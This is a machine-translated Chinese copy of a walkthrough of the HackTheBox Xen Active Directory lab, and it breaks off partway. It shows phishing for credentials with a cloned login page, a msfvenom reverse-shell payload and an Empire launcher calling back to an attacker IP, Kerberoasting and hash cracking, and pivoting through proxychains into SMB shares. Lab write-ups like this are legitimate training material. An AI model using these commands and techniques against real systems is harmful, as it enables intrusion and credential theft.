<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🖕🏿 🧒🏻 🎱 HackTheBox残局。演练Xen实验室。Pentest活动目录 👳🏿 🕚 👴🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在本文中，我们将不仅分析汽车的通道，而且还将分析HackTheBox网站上整个微型实验室的通道。
 
 如描述中所述，Xen旨在测试小型Active Directory环境中所有攻击阶段的技能。目标是在收集6个标志的同时，破坏可访问的主机，增加特权，并最终破坏整个域。在这里
 
 查看另一个“专业进...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox残局。演练Xen实验室。Pentest活动目录</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506980/"><img src="https://habrastorage.org/webt/-g/rq/3z/-grq3z8cvxjlhbkdm-hjxkdwcqc.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在本文中，我们将不仅分析汽车的通道，而且还将分析</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站上整个微型实验室的</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">通道</font></a><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如描述中所述，Xen旨在测试小型Active Directory环境中所有攻击阶段的技能。</font><font style="vertical-align: inherit;">目标是在收集6个标志的同时，破坏可访问的主机，增加特权，并最终破坏整个域。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">在这里</font></a></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
查看另一个“专业进攻行动实验室”的讨论</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">
通过VPN连接到实验室。</font><font style="vertical-align: inherit;">建议不要从可用对您重要的数据的工作计算机或主机进行连接，因为您会与一个在信息安全领域有所了解的人进入专用网络：)</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font><br>
<br><font style="vertical-align: inherit;"></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织信息</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">介绍</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这个残局包括6台机器，并包含6个标志。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qi/7m/jd/qi7mjdxucpxhje-cia76n_y_uio.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
还提供了可用主机的描述和地址。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ks/h6/wl/ksh6wls_-pv2e2rmk0xbg_cc-x4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们开始吧！</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">违反标志</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这台机器的IP地址为10.13.38.12，我将其添加到/ etc / hosts中。</font></font><br>
<code>10.13.38.12 xen.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
首先，我们扫描开放端口。</font><font style="vertical-align: inherit;">由于使用nmap扫描所有端口需要很长时间，因此我将首先使用masscan进行此操作。</font><font style="vertical-align: inherit;">我们以每秒500个数据包的速度扫描来自tun0接口的所有TCP和UDP端口。</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/38/-e/xn/38-exn8blvfxcaqrpue5ekc_hwk.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，有关在端口上运行的服务的更多详细信息，我们将使用-A选项运行扫描。</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A xen.htb -p25,80,443</code></pre><br>
<img src="https://habrastorage.org/webt/28/b1/pr/28b1pr7-okzchmg-ci1ggbaxpow.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我们有IIS和SMTP。同时，端口80和443上都有HTTP和HTTPS连接的可能性。让我们看一下网络-一个简单的网站迎接我们。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/up/in/cc/upinccvylfqvhode8at6xivs-ny.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
除了链接“加入团队”（向我们表明电子邮件地址jointheteam@humongousretail.com）以外，没有其他有趣的内容。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/1l/n2/k_/1ln2k_xo-b0vaxpdi1dhl2g2tqa.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们浏览目录。我为此使用了gobuster。在参数中，我们指示流128（-t），URL（-u），字典（-w）和我们感兴趣的扩展（-x）的数量。</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx</code></pre><br>
<img src="https://habrastorage.org/webt/0w/rp/et/0wrpetqsiwo1s2ylorprhhgugce.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们找到了一些有趣的目录。 401代码指示HTTP身份验证的存在，让我们看一下远程。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xo/du/8e/xodu8eovut5bbieahdwnatbyqqg.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们接受，并且需要凭据。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5v/e0/1w/5ve01wb7xkwxjghn9laebsvcsxm.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们需要凭证。这样，我决定返回SMTP服务器并对用户名进行排序（我建议使用Metasploit提供的用户名作为名称列表）。我们使用smtp-user-enum进行此操作。</font></font><br>
<br>
<pre><code class="bash hljs">smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb</code></pre><br>
<img src="https://habrastorage.org/webt/6x/vm/nf/6xvmnfxy7zrbwymwuy53mtsjub4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们找到4个电子邮件地址。由于我们看到了IT服务邮件，因此我们可以代表其他所有用户发送消息。让我们复制远程授权页面，制作一个伪造的页面，然后将所有虚假的Remote Portal地址发送给所有用户（实际上，当我发现这是正确的载体时，我感到非常惊讶）。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以使用Firefox的SingleFile扩展名来制作页面的完整副本。接下来，查看源代码并更改表单数据。第一个是更改将凭据发送到的地址，我设置了主机和端口81。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ki/_g/d3/ki_gd3wwmdo9rn2ywyixxrzlpdw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并添加提交以发送数据。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ad/zf/bx/adzfbxlqlhef4csitqunfnqmxks.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在运行netcat侦听端口81，激活Web服务器并将修改后的文件称为index.html。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jt/td/om/jttdomb7-i7rlqdhj4uasj9a8le.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/uf/-7/ud/uf-7ud36kzhbi3qvwd9yjlap2sw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
有用！</font><font style="vertical-align: inherit;">让我们发送有关更改门户地址的消息。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/kf/q6/nfkfq6zng1tkm8owwsztsoyisfq.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是向量是正确的，但是执行不是很好）。因此，我们以端口80的机械手形式获取了数据。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/de/xw/dp/dexwdpkgpo_oqb4ca2vczmwwqzi.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我们收集了所有帐户。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在我们去偏远地区。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/oq/v2/mvoqv2pe00qndtibx9aeprwh-uq.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们建议保存ICA文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/yd/ke/a3/ydkea3fwsacwjzdcfe6qptwo1ra.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接下来，我安装了Chromium的扩展程序。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/uf/nc/b4/ufncb4a2m0qdb2czjakbke5i9v4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并连接为pmorgan（VDESKTOP3）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/o8/ke/gx/o8kegx9kxnfiyskutyymimonhwo.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/a4/gb/1o/a4gb1of_eannxkf2gdhb-ra4cg8.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们对其他用户也是如此。</font><font style="vertical-align: inherit;">和安奈尔找到第一面旗帜。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/1z/vs/ig/1zvsigpck-o1os7hmzs70jecape.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并出租。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/yw/ii/9n/ywii9nxpta3h-scvghrdis9gpow.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并保存收集的信息。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部署标志</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可能会注意到，操作系统不是最新的，因此必须存在漏洞利用。</font><font style="vertical-align: inherit;">让我们扔出抄表器外壳。</font><font style="vertical-align: inherit;">首先，创建负载。</font></font><br>
<br>
<pre><code class="bash hljs">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.14.9 LPORT=3434 -f exe &gt; s.exe</code></pre><br>
<img src="https://habrastorage.org/webt/l6/cw/fp/l6cwfpozbfayv9egysl_lshdw-o.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在运行metasploit侦听器。</font></font><br>
<br>
<pre><code class="bash hljs">handler -H 10.14.14.9 -P 3434 -p windows/x64/meterpreter/reverse_tcp</code></pre><br>
<img src="https://habrastorage.org/webt/af/rg/xh/afrgxhmdhrqsctrusvic-hftrqy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们通过目标计算机上的浏览器，下载并运行负载。</font><font style="vertical-align: inherit;">在Metasploit窗口中，注意第一个会话中的连接。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gk/95/hl/gk95hlyj70r7tqijdrcc3cdpi9g.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/hp/cs/g-/hpcsg-39centm7wanbtccngaqa0.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，我们列出了LPE的所有漏洞。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ai/_l/nj/ai_lnjg4to9h_7u5uf4yl706fjw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
还有一些。</font><font style="vertical-align: inherit;">让我们使用第一个，它将允许您获取系统上下文。</font><font style="vertical-align: inherit;">启动一个新的侦听器。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/7t/bt/qe/7tbtqeoikcykli7ck9tategndxk.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并利用漏洞利用。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/3x/oz/pa/3xozpavk13cms-vl_yhxwy7a0rk.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
第二个会话在SYSTEM上下文中打开。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/cg/qi/uh/cgqiuh4chvqmax4smhxkopyae34.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们检查一下标志。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/lq/rn/4m/lqrn4m6ruh6a29ufxfmffi8xjvw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
拿去 </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2m/_g/ct/2m_gctbxaccolc792cmxvfb5bgi.png"><br>
<br>
<img src="https://habrastorage.org/webt/ty/fy/yv/tyfyyv-vw0yeo5eid8_gy4fwr4i.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如此容易传递另一个标志。</font><font style="vertical-align: inherit;">我们走得更远。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鬼旗</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为了进行进一步的探索，使用PowerShell十分方便，并且通过PowerShell Empire（我在</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此处</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">了</font></a><font style="vertical-align: inherit;">关于它</font><font style="vertical-align: inherit;">）的</font><font style="vertical-align: inherit;">工作更加方便</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">让我们打开会话，首先为它创建一个http和PS启动器。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; listeners<font></font>
&gt; uselistener http<font></font>
&gt; <span class="hljs-built_in">set</span> Host 10.14.14.9<font></font>
&gt; <span class="hljs-built_in">set</span> Port 5656<font></font>
&gt; execute<font></font>
&gt; back<font></font>
&gt; launcher powershell http</code></pre><br>
<img src="https://habrastorage.org/webt/nw/h8/k_/nwh8k_g7pvp4d25k6mcm_g5ase0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
将启动程序保存到s.ps1文件。</font><font style="vertical-align: inherit;">要通过meterpreter从内存运行它，您需要加载powershell模块。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xe/hf/0m/xehf0mmdd6b0-hmnfbbqivm45p0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并执行powershell_import。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/-f/nw/vv/-fnwvvmgxgd2stpsoceiizkfxhu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在Empire窗口中，找到创建的代理。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/f2/cm/7m/f2cm7mexe3pdgwtdgc_mghacli0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为了方便工作，请使用工作站名称重命名它并进入交互模式。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ne/vj/oh/nevjoh8xwwovniicwob5gp6k-6u.png"><br>
<br>
<img src="https://habrastorage.org/webt/hj/uc/n3/hjucn3yy2uihhkibe99yoamwpfi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为了获得智能，我们需要定义一个域控制器。</font><font style="vertical-align: inherit;">我们将在“情境意识”部分中一个出色的模块get_domain_controller的帮助下进行此操作。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_domain_controller<font></font>
&gt; run<font></font>
</code></pre><br>
<img src="https://habrastorage.org/webt/pf/xe/61/pfxe61ftwboyhaqczuzu16huiho.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这样我们就获得了有关域控制器的信息。</font><font style="vertical-align: inherit;">现在，让我们列出域用户。</font><font style="vertical-align: inherit;">此时，我需要获取帐户名和AdminCount属性的值，以立即识别特权用户。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties samaccountname,admincount<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/ep/bm/8n/epbm8n-0pxbqjkx8ugmru5mx84q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们立即检查SPN，以确定是否可以使用Kerberoasting。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties serviceprincipalname<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/24/tu/qt/24tuqtogjlqw_wyj_wtkmirvjjq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
还有SPN！</font><font style="vertical-align: inherit;">让我们使用同一个帝国进行Kerberoasting。</font><font style="vertical-align: inherit;">指定输出格式-hashcat。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule credentials/invoke_kerberoast<font></font>
&gt; <span class="hljs-built_in">set</span> OutputFormat Hashcat<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/fc/rt/n3/fcrtn3wmff8er48hsi4ck4epipe.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后我们得到用户哈希。</font><font style="vertical-align: inherit;">现在通过哈希猫进行迭代。</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 -a 0 krb.hash rockyou.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在rockyou词典中找不到此密码，因此我检查了Seclists的所有词典。</font><font style="vertical-align: inherit;">但是此选项也失败了。</font><font style="vertical-align: inherit;">最后一种选择是使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSA规则</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jx/zh/kx/jxzhkxufm6pnpkkqjbqpe-fmj-k.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如资料库中所述，潜水是最好的选择，因此我们使用它的第二个版本。</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2</code></pre><br>
<img src="https://habrastorage.org/webt/8t/m8/yy/8tm8yyoriogouhedrvjvixunnc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后，我们获得了该用户的密码。</font><font style="vertical-align: inherit;">为了进一步提高，让我们扫描本地网络。</font><font style="vertical-align: inherit;">最好使用ARP扫描，因为ICMP可能被阻止。</font><font style="vertical-align: inherit;">arpscan模块将帮助我们解决此问题，我们知道网络的地址和掩码，因此我们将设置主机范围。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/arpscan<font></font>
&gt; <span class="hljs-built_in">set</span> Range 172.16.249.0-172.16.249.255<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/7f/vh/qd/7fvhqd_c2vdhwqryakt7yi7kaxu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
从列表中，我们不知道两个主机：201和202。让我们检查域中的共享资源。</font><font style="vertical-align: inherit;">从参数中，我们只需要域控制器的地址。</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/share_finder<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/rs/p3/6d/rsp36dpdijzbbrioueihsptddj0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
每次扫描后，我们对网络的了解就会扩大，让我们找出什么样的主机CITRIX.htb.local。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/cu/rk/m0/curkm01lzbyve769e7kdt7jjao4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
以下是我们积累的信息。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/zd/8z/sdzd8z_kll5ijcesm_asfi6xqse.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
要与内部网络上的资源进行交互，我们需要配置隧道。</font><font style="vertical-align: inherit;">我们将使用autoroute命令在活动的meterpreter会话中执行此操作，并指定内部网络地址和掩码作为参数（使用-p参数，我们可以检查活动的路由）。</font></font><br>
<br>
<pre><code class="bash hljs">run autoroute -s 172.16.249.0/24 </code></pre><br>
<img src="https://habrastorage.org/webt/tn/tu/9y/tntu9y40tdn28avzmqtgl3o0ffw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，我们已经添加了到目标网络的路由，我们将在平台内部使​​用socks4a工具。</font><font style="vertical-align: inherit;">辅助模块assistant / server / socks4a提供了一个代理服务器，该代理服务器使用我们创建的Metasploit路由基础结构来中继连接。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/-v/_j/0b/-v_j0bfvhwes3e1slvn42fwceqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
作为客户端重定向器，我们使用代理链。</font><font style="vertical-align: inherit;">更改其/etc/proxychains.conf配置，指定由metasploit设置的端口（默认端口为1080）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/cy/_5/oh/cy_5ohot9iirrdzik2qssk8hj4a.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
对于找到的用户，Citrix $目录是可读的。</font><font style="vertical-align: inherit;">由于proxychains显示连接信息，因此我们使用重定向2&gt; / dev / null将其删除。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local 172.16.249.201 --share <span class="hljs-string">"Citrix$"</span> --shares 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/qv/nr/ol/qvnroleugjrgp-i5izk_ovbpdps.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们看看此资源上所有可用的东西。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains smbmap -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local -H 172.16.249.201 -R 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/mj/g3/-n/mjg3-n6art569eklzc6dsoqx_fy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们找到了标志以及ppk文件。</font><font style="vertical-align: inherit;">让我们获取所有文件。</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!</code></pre><br>
<img src="https://habrastorage.org/webt/bi/s2/hw/bis2hwyvpobzvdkqykpbac_wfz0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
连接时，出现错误，可以通过指定client min protocol选项来消除错误。</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option=<span class="hljs-string">'client min protocol=NT1'</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/vn/yi/bh/vnyibhq9ui9jd9-smv92jserdqg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并交出国旗。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zy/o3/uy/zyo3uyt0kbvkkijgwr_vdwnaa5i.png"><br>
<br>
<img src="https://habrastorage.org/webt/js/y2/pp/jsy2ppljrcwqjfvit23y4pzisig.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迷彩旗</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们找出Putty私钥。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u9/kg/z-/u9kgz-0fzwj3uftpn1yjzumc5qa.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
此私钥已加密，并设计用于SSH授权。</font><font style="vertical-align: inherit;">让我们看一下用于解密密钥的密码。</font><font style="vertical-align: inherit;">为此，请重新格式化john格式的密钥。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ui/-y/rw/ui-yrwxnm9mh_b-_p7ae2lbkbtc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是对标准词典进行分类无法正常工作，它们提示了我一个用于生成“便捷输入”密码的出色工具</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-kwprocessor</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">让我们创建一个字典。</font></font><br>
<br>
<pre><code class="bash hljs">./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route</code></pre><br>
<img src="https://habrastorage.org/webt/xe/mz/j0/xemzj0okpereyu2ubrjiz7u7esi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们已经成功找到了16个字符的密码。</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./kwprocessor/key-dict.txt putty.john</code></pre><br>
